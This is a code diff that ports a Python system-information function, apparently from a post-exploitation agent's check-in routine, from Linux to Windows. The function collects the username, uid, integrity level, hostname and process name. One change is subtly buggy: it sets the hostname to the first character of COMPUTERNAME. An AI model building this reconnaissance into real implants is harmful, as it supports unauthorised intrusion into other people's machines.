@@ -1,6 +1,6 @@
 import os
 import sys
-import pwd
+#import pwd
 import socket
 import subprocess
 
@@ -11,11 +11,13 @@ def get_sysinfo(nonce='00000000'):
     __FAILED_FUNCTION = '[FAILED QUERY]'
 
     try:
-        username = pwd.getpwuid(os.getuid())[0].strip("\\")
+        #username = pwd.getpwuid(os.getuid())[0].strip("\\")
+        username = os.getenv("USERNAME")
     except Exception as e:
         username = __FAILED_FUNCTION
     try:
-        uid = os.popen('id -u').read().strip()
+        #uid = os.popen('id -u').read().strip()
+        uid = "1000"
     except Exception as e:
         uid = __FAILED_FUNCTION
     try:
@@ -23,11 +25,13 @@ def get_sysinfo(nonce='00000000'):
     except Exception as e:
         highIntegrity = __FAILED_FUNCTION
     try:
-        osDetails = os.uname()
+        #osDetails = os.uname()
+        osDetails = os.getenv("COMPUTERNAME")
     except Exception as e:
         osDetails = __FAILED_FUNCTION
     try:
-        hostname = osDetails[1]
+        #hostname = osDetails[1]
+        hostname = osDetails[0]
     except Exception as e:
         hostname = __FAILED_FUNCTION
     try:
@@ -52,12 +56,16 @@ def get_sysinfo(nonce='00000000'):
         pyVersion = __FAILED_FUNCTION
 
     language = 'python'
-    cmd = 'ps %s' % (os.getpid())
+    #cmd = 'ps %s' % (os.getpid())
+    cmd = 'tasklist /FI \"PID eq %s\" /NH /FO csv' % (os.getpid())
     ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     out, err = ps.communicate()
-    parts = out.split("\n")
-    if len(parts) > 2:
-        processName = " ".join(parts[1].split()[4:])
+    #parts = out.split("\n")
+    parts = out.split(",")[0]
+    if parts:
+        processName = parts.strip("\"")
+    #if len(parts) > 2:
+    #    processName = " ".join(parts[1].split()[4:])
     else:
         processName = 'python'
 
